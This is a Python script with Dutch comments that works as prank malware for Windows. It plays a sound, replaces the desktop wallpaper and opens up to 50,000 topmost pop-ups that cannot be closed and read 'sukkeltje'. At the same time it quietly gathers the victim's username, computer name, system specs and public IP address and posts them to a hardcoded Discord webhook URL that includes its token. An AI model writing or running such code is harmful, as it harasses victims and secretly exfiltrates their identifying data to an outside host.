import tkinter as tk
from PIL import Image, ImageTk
import random
import threading
import time
import ctypes
import requests
import os
import platform
import psutil
from datetime import datetime
from playsound import playsound

# ====== Vul hier je eigen Discord webhook in ======
WEBHOOK_URL = "https://discord.com/api/webhooks/1394773614213206016/X33dRtbFV-8WzKU_YyAax0-tDTywlRpRDn9EPFGrgBCYQUCC13oGL4pQosouRnoxtjNP"  # <-- vervang hier

# === Configuratie ===
POPUP_COUNT = 50000       # Aantal pop-ups
POPUP_DELAY = 0.1         # Tussen pop-ups (seconden)
POPUP_BG_IMAGE = "achtergrond.png"  # Achtergrond voor pop-ups
WALLPAPER_IMAGE = "wallpaper.jpg"   # Achtergrond wallpaper
SOUND_FILE = "sound.mp3"             # Geluidsbestand

def set_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    result = ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
    if result:
        print("✅ Achtergrond succesvol aangepast.")
    else:
        print("❌ Achtergrond aanpassen mislukt.")

def show_tk_popup():
    root = tk.Tk()
    root.withdraw()

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    width, height = 300, 150
    x = random.randint(0, screen_width - width)
    y = random.randint(0, screen_height - height)

    win = tk.Toplevel()
    win.geometry(f"{width}x{height}+{x}+{y}")
    win.overrideredirect(False)
    win.attributes("-topmost", True)
    win.resizable(False, False)

    # Sluitknop blokkeren
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    try:
        image = Image.open(POPUP_BG_IMAGE).resize((width, height))
        bg = ImageTk.PhotoImage(image)
        label = tk.Label(win, image=bg)
        label.image = bg
        label.pack()

        tekst = tk.Label(win, text="sukkeltje", fg="white", bg="black", font=("Arial", 14, "bold"))
        tekst.place(relx=0.5, rely=0.5, anchor="center")
    except Exception:
        label = tk.Label(win, text="sukkeltje", font=("Arial", 14), fg="red")
        label.pack(expand=True)

    ctypes.windll.user32.MessageBeep(0x10)
    win.after(10000, win.destroy)  # Sluit na 10 seconden
    win.mainloop()

def spam_popups():
    for _ in range(POPUP_COUNT):
        threading.Thread(target=show_tk_popup).start()
        time.sleep(POPUP_DELAY)

def get_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "IP onbekend"

def format_bytes(bytes_size):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_size < 1024.0:
            return f"{bytes_size:.2f} {unit}"
        bytes_size /= 1024.0

def get_pc_info():
    return {
        "Gebruiker": os.getlogin(),
        "Computernaam": platform.node(),
        "Besturingssysteem": f"{platform.system()} {platform.release()}",
        "CPU": platform.processor(),
        "RAM": format_bytes(psutil.virtual_memory().total),
        "IP-adres": get_ip(),
        "Uptime (sinds)": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    }

def send_pc_info():
    info = get_pc_info()
    embed = {
        "title": "🖥️ PC Informatie",
        "color": 3447003,
        "fields": [{"name": key, "value": f"{value}", "inline": False} for key, value in info.items()],
        "footer": {"text": "Systeem Logger"}
    }
    payload = {
        "embeds": [embed],
        "username": "SystemBot"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print("Webhook mislukt:", e)

def play_sound_async(sound_file):
    threading.Thread(target=playsound, args=(sound_file,), daemon=True).start()

if __name__ == "__main__":
    # Start geluid in aparte thread zodat het niet blokkeert
    play_sound_async(SOUND_FILE)

    # Verander desktop achtergrond
    set_wallpaper(WALLPAPER_IMAGE)

    # Start pop-ups in aparte thread (zodat console niet blokkeert)
    threading.Thread(target=spam_popups).start()

    # Verstuur systeeminformatie
    send_pc_info()
